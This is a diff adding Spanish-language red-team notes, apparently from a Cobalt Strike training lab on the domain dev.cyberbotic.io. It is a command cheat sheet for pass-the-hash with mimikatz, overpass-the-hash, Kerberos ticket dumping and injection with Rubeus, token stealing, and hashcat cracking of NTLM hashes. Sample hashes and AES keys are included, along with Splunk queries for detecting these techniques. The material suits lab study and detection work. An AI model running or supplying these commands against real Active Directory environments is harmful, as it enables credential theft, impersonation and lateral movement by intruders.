@@ -377,6 +377,98 @@ ps
 steal_token 3320 proceso
 rev2self
 
+#SpawnAs
+spawnas DEV\user password tcp-4444-local
+
+#OPSEC
+4624: An account was successfully logged on
+LOGON32_LOGON_INTERACTIVE
+Proccess Create 1
+
+#PassTheHash
+Realiza una sesion con un NTLM
+Parchea LSASS requiere privilegios administrador local
+pth DEV\user ntlm
+lo carga autmaaticamente
+ls \\maquina\c$
+
+#OPSEC
+sysmon cmd.exe
+source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="C:\\Windows\\System32\\cmd.exe" CommandLine="*\\\\.\\pipe\\*"
+Computadora: wkstn-1.dev.cyberbotic.io 
+LogonId: 0xe6d64 
+Imagen principal: C: \ Windows \ System32 \ rundll32.exe 
+Usuario: NT AUTHORITY \ SYSTEM
+source = "WinEventLog: Security" EventCode = 4624 0xe6d64
+
+para evitar \pipe\ hacerlo manualmente
+mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:4ffd3eabdce2e158d923ddec72de979e
+crear un proceso
+powershell -w hidden
+atachearse a este
+steal_token 6284
+al terminar rev2self kill
+rev3self
+kill 6284
+
+#OVERPASS THE HASH
+Se realice a través de Kerberos en lugar de NTLM o AES
+Solicita un TGT para el usuario que queremos suplantar.
+Cree una sesión de inicio de sesión de sacrificio.
+Pase el TGT a esa sesión de inicio de sesión.
+Accede al recurso de destino.
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:user /domain:dev.dominio /rc4:ntlm /nowrap
+
+#OPSEC
+source = "WinEventLog: Security" EventCode = 4768 Ticket_Encryption_Type = 0x17
+
+PEDIRLO SIN PREVIA AUTENTICACION
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:user /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec
+run klists
+pillar el id 0:0x1f253
+ahora con una contraseña ficticia hacemos una nueva sesion
+make_token CER\User passwordmal
+run klist
+Tickets(0)
+[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
+echo -en "[...ticket...]" | base64 -d > jkingTGT.kirbi
+kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
+getuid
+
+modo acortado
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+steal_token 3044
+ls \\maquina\c$
+----------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------
+#Extraccion Tickets Kerberos
+En lugar de usar el hash NTLM o las claves AES para solicitar un TGT para el usuario, en realidad podemos extraer sus TGT directamente de la memoria si están conectados a una máquina que controlamos
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
+mejor que sea elevado sino solo muestra tickets de sesion de inicio
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
+steal_token 4872
+tambien sirve para TGS
+
+#Password
+Hashcat 
+John
+hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -m 1000 NTLM
+hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -r rules\add-year.rule
+
+#Session Passing
+
+
+
+
+
+
+
+
+
+
+
 
 
 
